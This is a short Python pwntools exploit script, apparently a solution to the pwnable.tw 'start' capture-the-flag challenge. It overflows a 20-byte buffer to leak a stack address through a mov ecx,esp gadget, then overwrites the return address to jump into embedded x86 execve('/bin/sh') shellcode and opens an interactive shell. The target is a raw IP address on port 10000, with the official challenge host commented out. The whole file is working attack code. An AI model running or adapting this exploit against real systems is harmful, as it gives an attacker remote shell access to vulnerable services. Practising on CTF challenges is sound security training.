#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("start")
libc = elf.libc

local = False 
if local:
    p = process("./start")
    #p = elf.debug(gdbscript='''''')
else:
    #p = remote('chall.pwnable.tw', 10000)
    p = remote('103.179.184.83', 10000)

elf = context.binary = ELF('./start', checksec=False)


mov_ecx_esp = 0x8048087
payload = flat(
    b"a"*20,
    mov_ecx_esp
    )
p.sendafter(b" CTF:",payload)
leak = int.from_bytes(p.recv(8),"little") - 0x100000000

shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode_addr = leak + 20
print("[-]Leak:             ", hex(leak))
print("[-]Shellcode_addr:   ", hex(shellcode_addr))
payload = flat(
    b"B"*20,
    shellcode_addr,
    shellcode
    )
p.sendline(payload)


p.interactive()